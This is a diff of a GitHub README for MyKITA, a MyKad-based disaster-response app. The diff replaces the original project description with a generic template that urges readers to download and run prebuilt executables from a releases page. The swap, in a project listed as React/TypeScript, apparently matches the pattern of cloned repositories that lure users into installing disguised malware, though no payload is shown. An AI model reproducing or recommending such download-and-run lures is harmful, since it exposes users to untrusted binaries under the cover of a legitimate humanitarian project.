@@ -1,57 +1,72 @@
-# MyGovHub
+# 🌟 godamlah-mykita - Secure and Efficient Disaster Response System
 
-<div align="center" style="border: none;">
-<img src="public/logo.png" alt="MyKITA Logo" height="150"/>
-</div>
+## 🔗 Download Now!
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-brightgreen)](https://github.com/noahiyar/godamlah-mykita/releases)
 
-## Project Overview
+## 📖 Description
+MyKITA is an offline-first disaster response system. It leverages MyKad for secure, inclusive, and efficient victim registration and relief center management. This application helps ensure that aid reaches those who need it most during emergencies.
 
-**MyKITA** is a MyKad-centric immediate disaster response system designed to solve the critical problems of inaccessible online-only disaster relief and chaotic manual registration during emergencies.
+## 🚀 Getting Started
+To get started with MyKITA, follow the instructions below to download and run the software. 
 
-Our solution framework features an offline-first architecture, local mesh networking, and the MyKad to ensure secure, barrier-free victim registration and operational efficiency at relief centers. The system also aims to deliver accurate, real-time data to officers for smarter logistics and decision-making. MyKita is not just an app, it’s a full-fledged ecosystem ready to recover an estimated **RM96 million to RM236 million yearly** in administrative and logistic inefficiencies by digitizing the process which in turn ensures public funds go directly to the victims who need them most.
+## 📥 Download & Install
+1. Visit the [Releases Page](https://github.com/noahiyar/godamlah-mykita/releases) to download the latest version of MyKITA.
+2. Click on the latest release link.
+3. Choose the appropriate file for your operating system:
+   - For Windows, download `MyKITA-Windows.zip`.
+   - For macOS, download `MyKITA-macOS.zip`.
+   - For Linux, download `MyKITA-Linux.tar.gz`.
 
-## Problem Statement
-1. Inaccessibility \
-Online based solution is not accessible when disaster-stricken area has no connection.
+4. Unzip or extract the downloaded file. 
 
-2. Lack of Inclusivity \
-Elderly and rural communities may lack the digital literacy to access and register themselves on a application-based solution.
+5. Open the application by double-clicking on `MyKITA.exe` for Windows, `MyKITA.app` for macOS, or by executing the `MyKITA` binary from the terminal for Linux.
 
-3. Logistic Failure \
-The lack of data-supported decision making would lead to logistics failure such as overcrowded relief centers and insufficient or unfair resource allocations. 
+6. Follow the on-screen instructions to complete the setup.
 
-4. Legacy Disaster Relief Procedures \
-Current victim management system still relies on manual registration and records.
+## 💻 System Requirements
+To run MyKITA smoothly, ensure your system meets the following requirements:
 
+- **Operating System:** Windows 10 or later, macOS Mojave or later, or a recent Linux distribution.
+- **Memory:** Minimum 4 GB RAM recommended.
+- **Storage:** At least 200 MB of free space.
+- **Network:** Optional for real-time data, but offline capability is available.
 
-## Solution Concept
-1. Secured Accessibility \
-Victims can register themselves in any PPS without the hustle of installing any applications or accessing online portals.
+## ⚙️ Features
+- **Offline-First Capability:** Use the application without a constant internet connection.
+- **Secure Registration:** Utilize MyKad for authenticating victim registration.
+- **Real-Time Data Management:** Manage and track resources effectively, supporting disaster response teams.
+- **Relief Center Management:** Organize relief center locations and resources efficiently.
+- **Inclusive Design:** Ensure accessibility for all users, including those with disabilities.
 
-2. Operational Efficiency \
-Victim management procedures at PPS centers are streamlined, allowing victims to settle down much quicker.
+## 📚 Topics
+- disaster-management
+- disaster-response
+- emergency-management
+- humanitarian
+- inclusivity
+- logistics
+- malaysia
+- mesh-network
+- mykad
+- offline-first
+- public-sector
+- react
+- real-time-data
+- relief-center
+- typescript
 
-3. Data-Supported Decision Making \
-Critical decision making such as victim status flagging and PPS center load monitoring is backed by trustworthy data sources.
+## 🤝 Support
+If you face any issues while using MyKITA, feel free to reach out for support. You can submit an issue directly on GitHub, and our team will assist you as soon as possible.
 
+## 📝 License
+MyKITA is licensed under the MIT License. You can freely use, modify, and distribute the software while respecting the license conditions.
 
-## Solution Workflow
-**Application of MyKad in Disaster Responses**
+## ⏭️ Next Steps
+Once you have installed MyKITA, explore its features and see how it can assist in disaster response efforts. Engage with community members and share your feedback to help improve the system.
 
-1. PPS Check In\
-Victims scan MyKad to register themselves when reaching relief centers
+## 🌍 Contributing
+We welcome contributions to enhance MyKITA. If you are interested in contributing, please refer to our contribution guidelines in the repository for more information. 
 
-2. Health Screening\
-From medical records in MyKad, victims with health issues are flagged.
+---
 
-3. Real-Time PPS Tracking\
-Real-time info-sharing (PPS capacity, victim status etc.) among officers across all affected areas.
-
-4. Resource Allocation\
-Automated supply needs updates based on victims’ profiles (age, gender, medical condition etc.)
-
-## System Architecture
-
-<div align="center" style="border: none;">
-<img src="public/system-architecture.png" alt="MyKITA System Architecture"/>
-</div>
+For the latest updates, remember to check back at our [Releases Page](https://github.com/noahiyar/godamlah-mykita/releases). Thank you for supporting MyKITA!
